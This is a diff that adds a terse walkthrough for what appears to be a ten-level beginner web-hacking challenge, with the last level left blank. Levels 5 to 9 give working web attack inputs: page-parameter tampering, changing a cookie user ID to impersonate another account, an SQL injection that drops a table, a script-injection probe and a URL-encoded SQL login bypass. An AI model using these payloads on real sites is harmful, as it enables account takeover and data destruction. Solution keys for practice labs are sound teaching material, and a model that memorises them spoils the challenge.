@@ -1,0 +1,33 @@
+Level-1
+Highlight the entire webpage with ctrl+a
+
+Level-2
+Press F12 to bring up the inspector to see the comments.
+
+Level-3
+Information for the next level is hidden in users.txt.
+See the source code. the logo is being loaded from `files` folder. Go to level3/files and open users.txt
+
+Level-4
+Source code has references to localstorage.
+Check localstorage and get the combination.
+Combination: Y29tYml0ZWNoIGlzIGNvb2w=
+
+Level-5
+Read comments > go to `About` > url ?page=about > ?page=secret-file
+
+Level-6
+Create a user > login > change cookie UID from 2 to 1. Then reload the page.
+
+Level-7
+'; DROP TABLE books; --
+
+Level-8
+?level=8
+?level=<script>alert('xss')</script>
+
+Level-9
+convert 'or''=' to hex: %27%20%6f%72%20%27%27%3d%27
+
+Level-10
+
